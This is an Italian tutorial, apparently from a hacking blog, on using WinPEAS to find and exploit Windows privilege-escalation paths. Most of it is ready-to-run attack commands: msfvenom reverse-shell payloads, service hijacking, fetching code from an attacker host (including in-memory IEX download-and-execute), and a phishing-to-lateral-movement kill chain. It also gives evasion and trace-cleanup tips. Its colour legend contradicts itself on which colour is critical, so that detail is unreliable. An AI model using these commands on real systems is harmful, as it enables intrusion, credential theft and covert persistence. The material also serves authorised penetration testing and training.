---
title: 'WinPEAS: guida completa all’enumerazione Windows per privilege escalation'
slug: winpeas
description: 'Scopri come usare WinPEAS per trovare vettori di privilege escalation su Windows: servizi vulnerabili, credenziali salvate, AlwaysInstallElevated, permessi deboli e misconfiguration utili nel post-exploitation.'
image: /winpeas.webp
draft: true
date: 2026-04-01T00:00:00.000Z
categories:
  - tools
subcategories:
  - post-exploit
tags:
  - privesc-windows
  - privilege-enumeration
---

WinPEAS (Windows Privilege Escalation Awesome Scripts) è lo script di enumeration definitivo per identificare vettori di privilege escalation su sistemi Windows. In pochi minuti analizza centinaia di configurazioni, permessi, credenziali cached e misconfiguration che potrebbero permettere l'escalation da utente standard a SYSTEM. In questa guida impari a eseguire WinPEAS, interpretare l'output colorato e sfruttare le vulnerabilità identificate.

## Posizione nella Kill Chain

WinPEAS opera nella fase di privilege escalation post-exploitation:

| Fase              | Tool Precedente                                            | WinPEAS           | Tool Successivo                                    |
| ----------------- | ---------------------------------------------------------- | ----------------- | -------------------------------------------------- |
| Initial Access    | [Metasploit](https://hackita.it/articoli/metasploit) shell | → Upload WinPEAS  | → Enumeration                                      |
| Enumeration       | Shell stabilizzata                                         | → Scan completo   | → Identify vectors                                 |
| PrivEsc           | Vector identified                                          | → Exploit path    | → SYSTEM access                                    |
| Credential Access | SYSTEM achieved                                            | → Credential dump | → [Mimikatz](https://hackita.it/articoli/mimikatz) |

## Installazione e Setup

### Download

```bash
# Versione .exe (compilata, più facile da usare)
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe

# Versione .bat (no dependency, più stealth)
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat

# Versione PowerShell
wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1
```

### Trasferimento su Target

```bash
# Via Python HTTP server
python3 -m http.server 80

# Sul target (PowerShell)
Invoke-WebRequest http://ATTACKER/winPEASx64.exe -OutFile C:\Windows\Temp\wp.exe

# Via certutil
certutil -urlcache -split -f http://ATTACKER/winPEASx64.exe C:\Windows\Temp\wp.exe
```

### Verifica Esecuzione

```cmd
C:\Windows\Temp\wp.exe --help
```

## Uso Base

### Esecuzione Standard

```cmd
C:\Windows\Temp\winPEASx64.exe
```

Output: enumeration completa con output colorato (RED = critico, YELLOW = interessante).

### Esecuzione con Log

```cmd
winPEASx64.exe > C:\Windows\Temp\winpeas_output.txt
```

### Esecuzione Quiet (Meno Output)

```cmd
winPEASx64.exe quiet
```

### Moduli Specifici

```cmd
# Solo informazioni sistema
winPEASx64.exe systeminfo

# Solo servizi
winPEASx64.exe servicesinfo

# Solo credenziali
winPEASx64.exe windowscreds
```

## Interpretazione Output

### Colori e Priorità

| Colore    | Significato     | Azione            |
| --------- | --------------- | ----------------- |
| 🔴 RED    | Interessante    | Investigare       |
| 🟡 YELLOW | Vettore critico | Exploit immediato |
| 🟢 GREEN  | Info utile      | Nota per later    |
| ⚪ WHITE   | Standard        | Background info   |

### Sezioni Principali

1. **System Information**: OS, patch level, architecture
2. **Users Information**: Local users, groups, logged sessions
3. **Processes**: Running processes, services
4. **Services**: Unquoted paths, weak permissions
5. **Applications**: Installed software, potential vulnerabilities
6. **Network**: Connections, firewall rules
7. **Windows Credentials**: Cached creds, autologon, WiFi passwords

## Vettori di Privilege Escalation

### Unquoted Service Paths

WinPEAS identifica servizi con path non quotati:

```
[!] Unquoted Service Paths
    Name: VulnService
    PathName: C:\Program Files\Vuln App\service.exe
```

Exploit:

```cmd
# Crea payload in location intercettabile
copy payload.exe "C:\Program Files\Vuln.exe"

# Riavvia servizio (se possibile)
sc stop VulnService
sc start VulnService
```

### Weak Service Permissions

```
[!] Modifiable Services
    Name: WeakService
    Current user can modify: True
```

Exploit:

```cmd
# Modifica binpath per eseguire payload
sc config WeakService binpath= "C:\Windows\Temp\shell.exe"
sc stop WeakService
sc start WeakService
```

### AlwaysInstallElevated

```
[!] AlwaysInstallElevated enabled
    HKLM: 1
    HKCU: 1
```

Exploit:

```bash
# Genera MSI payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f msi > shell.msi

# Sul target
msiexec /quiet /qn /i shell.msi
```

### Stored Credentials

```
[!] Stored Credentials
    Target: Domain:target=server01
    User: admin
```

Exploit:

```cmd
cmdkey /list
runas /savecred /user:admin cmd.exe
```

## Scenari Pratici di Penetration Test

### Scenario 1: PrivEsc via Unquoted Service Path

**Timeline stimata: 20 minuti**

```cmd
# COMANDO: Esegui WinPEAS
C:\Windows\Temp\winPEASx64.exe servicesinfo
```

## OUTPUT ATTESO

```
====================================
    Unquoted Service Paths
====================================
[!] Check for this vulnerability 
    Name: UpdateService
    PathName: C:\Program Files\Update Manager\Service\updater.exe
```

```cmd
# COMANDO: Verifica permessi directory
icacls "C:\Program Files\Update Manager"
```

## OUTPUT ATTESO

```
C:\Program Files\Update Manager BUILTIN\Users:(W)
```

```bash
# COMANDO: Genera payload (attacker machine)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe > Update.exe
```

```cmd
# COMANDO: Posiziona payload
copy \\192.168.1.50\share\Update.exe "C:\Program Files\Update.exe"

# COMANDO: Riavvia servizio
sc stop UpdateService
sc start UpdateService
```

## OUTPUT ATTESO

```
# Sul listener
[*] Command shell session opened
C:\Windows\system32> whoami
nt authority\system
```

### COSA FARE SE FALLISCE

* **Access denied su directory**: Cerca altre directory nel path. Prova `C:\Program.exe`.
* **Non puoi riavviare servizio**: Attendi reboot o cerca altro vettore.
* **AV blocca payload**: Usa payload obfuscato o tecnica diversa.

### Scenario 2: PrivEsc via AlwaysInstallElevated

**Timeline stimata: 15 minuti**

```cmd
# COMANDO: Check registry
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

## OUTPUT ATTESO

```
AlwaysInstallElevated    REG_DWORD    0x1
```

```bash
# COMANDO: Genera MSI (attacker)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f msi -o shell.msi
```

```cmd
# COMANDO: Esegui MSI con elevazione
msiexec /quiet /qn /i \\192.168.1.50\share\shell.msi
```

### Scenario 3: Credential Harvesting

**Timeline stimata: 10 minuti**

```cmd
# COMANDO: WinPEAS credential scan
winPEASx64.exe windowscreds
```

## OUTPUT ATTESO

```
====================================
    Windows Credentials
====================================
[!] Autologon credentials
    DefaultUserName: admin
    DefaultPassword: P@ssw0rd123!

[!] Wifi passwords
    SSID: CorpWiFi
    Password: WiFiP@ss2024

[!] Stored Credentials (cmdkey)
    Target: Domain:target=DC01
    User: CORP\svc_backup
```

### Scenario 4: Full Kill Chain con WinPEAS

**Timeline totale: 60 minuti**

1. **Initial Access (15min)**: Phishing → shell utente standard
2. **Enumeration (10min)**: WinPEAS → identifica vettore
3. **PrivEsc (15min)**: Exploit weak service → SYSTEM
4. **Credential Dump (10min)**: [Mimikatz](https://hackita.it/articoli/mimikatz) → hash/password
5. **Lateral Movement (10min)**: [PsExec](https://hackita.it/articoli/psexec) → altri host

## Defense Evasion

### Tecnica 1: Versione .bat

La versione batch è meno rilevata:

```cmd
winPEAS.bat > output.txt
```

### Tecnica 2: Obfuscated Execution

```powershell
# Scarica ed esegui in memoria
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/winPEAS.ps1')
```

### Tecnica 3: Rename Binary

```cmd
copy winPEASx64.exe svchost_update.exe
svchost_update.exe
```

## Integration Matrix

| WinPEAS +                                                      | Risultato             | Workflow                                    |
| -------------------------------------------------------------- | --------------------- | ------------------------------------------- |
| [Metasploit](https://hackita.it/articoli/metasploit-framework) | Auto-exploit          | WinPEAS trova → MSF local exploit suggester |
| [Mimikatz](https://hackita.it/articoli/mimikatz)               | Cred dump post-SYSTEM | WinPEAS → PrivEsc → Mimikatz                |
| [BloodHound](https://hackita.it/articoli/bloodhound)           | AD path               | WinPEAS creds → BloodHound analysis         |
| [Seatbelt](https://hackita.it/articoli/seatbelt)               | Cross-validation      | WinPEAS + Seatbelt per coverage completa    |

## Confronto: WinPEAS vs Alternative

| Feature  | WinPEAS     | Seatbelt  | PowerUp  | Watson   |
| -------- | ----------- | --------- | -------- | -------- |
| Coverage | Molto ampia | Ampia     | Media    | Solo CVE |
| Output   | Colorato    | JSON/Text | Text     | Text     |
| Stealth  | Basso       | Medio     | Alto     | Alto     |
| Speed    | Lento       | Veloce    | Veloce   | Veloce   |
| Focus    | Tutto       | Security  | Services | Patches  |

**Quando usare WinPEAS**: enumeration iniziale completa, non ti preoccupa il rumore.

**Quando usare alternative**: serve stealth, target specifico, time-sensitive.

## Detection e Countermeasures

### Cosa Cerca il Blue Team

* Processo winPEAS/PEASS in esecuzione
* Registry queries massive
* Enumeration pattern (servizi, task, autologon)
* File con nome contenente "peas" o "priv"

### Evasion Tips

1. **Rinomina sempre**: `winPEASx64.exe` → `svc_update.exe`
2. **Esegui da memoria** quando possibile
3. **Frammenta output** eseguendo moduli singoli
4. **Pulisci tracce** dopo esecuzione

```cmd
del C:\Windows\Temp\wp.exe
del C:\Windows\Temp\output.txt
```

## Troubleshooting

### WinPEAS non si avvia

```cmd
# Verifica architettura
echo %PROCESSOR_ARCHITECTURE%
# Usa x86 o x64 appropriato
```

### Output non colorato

```cmd
# Forza colori ANSI
winPEASx64.exe -linpeas

# Oppure usa versione no-color
winPEASx64.exe quiet
```

### Troppo output

```cmd
# Esegui solo sezioni specifiche
winPEASx64.exe servicesinfo
winPEASx64.exe windowscreds
```

### AV blocca esecuzione

```powershell
# Prova versione PowerShell
Set-ExecutionPolicy Bypass -Scope Process
.\winPEAS.ps1

# Oppure .bat
winPEAS.bat
```

## Cheat Sheet Comandi

| Operazione          | Comando                           |
| ------------------- | --------------------------------- |
| Esecuzione completa | `winPEASx64.exe`                  |
| Solo servizi        | `winPEASx64.exe servicesinfo`     |
| Solo credenziali    | `winPEASx64.exe windowscreds`     |
| Solo system info    | `winPEASx64.exe systeminfo`       |
| Solo applicazioni   | `winPEASx64.exe applicationsinfo` |
| Solo network        | `winPEASx64.exe networkinfo`      |
| Output quiet        | `winPEASx64.exe quiet`            |
| Log su file         | `winPEASx64.exe > output.txt`     |
| Versione batch      | `winPEAS.bat`                     |
| Versione PowerShell | `.\winPEAS.ps1`                   |

## FAQ

**WinPEAS vs LinPEAS?**

WinPEAS per Windows, [LinPEAS](https://hackita.it/articoli/linpeas) per Linux. Stessa famiglia PEASS-ng.

**È necessario essere admin per eseguire WinPEAS?**

No, funziona come utente standard. L'obiettivo è trovare come diventare admin.

**WinPEAS può danneggiare il sistema?**

No, è solo enumeration read-only. Non modifica nulla.

**Quanto tempo richiede l'esecuzione?**

Da 1 a 5 minuti dipendendo dal sistema. Usa `quiet` per velocizzare.

**Perché alcuni check sono rossi ma non exploitabili?**

WinPEAS segnala potenziali vettori, non sempre sono sfruttabili. Richiede verifica manuale.

**È legale usare WinPEAS?**

Solo su sistemi autorizzati. Per penetration test professionali, [hackita.it/servizi](https://hackita.it/servizi).

***

*Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).*

**Risorse**: [PEASS-ng GitHub](https://github.com/carlospolop/PEASS-ng) | [HackTricks Windows PrivEsc](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
